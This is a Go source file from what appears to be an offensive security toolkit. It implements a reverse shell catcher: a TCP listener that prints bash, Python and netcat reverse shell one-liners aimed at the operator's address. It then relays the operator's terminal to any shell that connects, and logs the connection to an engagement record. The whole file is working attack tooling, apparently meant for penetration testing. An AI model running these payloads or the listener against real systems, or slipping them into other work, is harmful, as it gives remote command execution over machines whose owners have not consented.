package catcher

import (
	"fmt"
	"io"
	"net"
	"os"
	"time"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
)

func Run() error {
	ui.Header("Reverse Shell Catcher — TCP Listener")

	port := ui.PromptDefault("Listen port", "4444")
	multi := ui.Confirm("Stay open for multiple connections?")

	localIP := getLocalIP()
	fmt.Println()
	ui.Success(fmt.Sprintf("Listening on %s:%s", localIP, port))
	ui.Info("Drop one of these on the target:")
	fmt.Printf("\n")
	fmt.Printf("  bash    bash -i >& /dev/tcp/%s/%s 0>&1\n", localIP, port)
	fmt.Printf("  python  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'\n", localIP, port)
	fmt.Printf("  nc      nc -e /bin/sh %s %s\n", localIP, port)
	fmt.Printf("\n")
	ui.Warn("Ctrl+C to cancel listener.")
	ui.Divider()

	for {
		ln, err := net.Listen("tcp", ":"+port)
		if err != nil {
			ui.Fail(fmt.Sprintf("Cannot bind %s: %v", port, err))
			return nil
		}

		conn, err := ln.Accept()
		ln.Close()
		if err != nil {
			return nil
		}

		remoteAddr := conn.RemoteAddr().String()
		ts := time.Now()
		fmt.Printf("\n")
		ui.Success(fmt.Sprintf("Shell from %s  [%s]", remoteAddr, ts.Format("15:04:05")))
		fmt.Println()

		eng, _ := engagement.Active()
		if eng != nil {
			engagement.LogFinding(eng.ID, "catcher", remoteAddr,
				fmt.Sprintf("Reverse shell received from %s", remoteAddr),
				fmt.Sprintf("Connected at %s", ts.Format(time.RFC3339)),
				"CRITICAL", "")
		}

		handleShell(conn)
		conn.Close()

		fmt.Println()
		ui.Warn("Connection closed.")

		if !multi {
			break
		}
		ui.Info(fmt.Sprintf("Listening again on %s:%s...", localIP, port))
		ui.Divider()
	}

	ui.PressEnter()
	return nil
}

func handleShell(conn net.Conn) {
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(conn, os.Stdin)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(os.Stdout, conn)
		done <- struct{}{}
	}()
	<-done
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "0.0.0.0"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
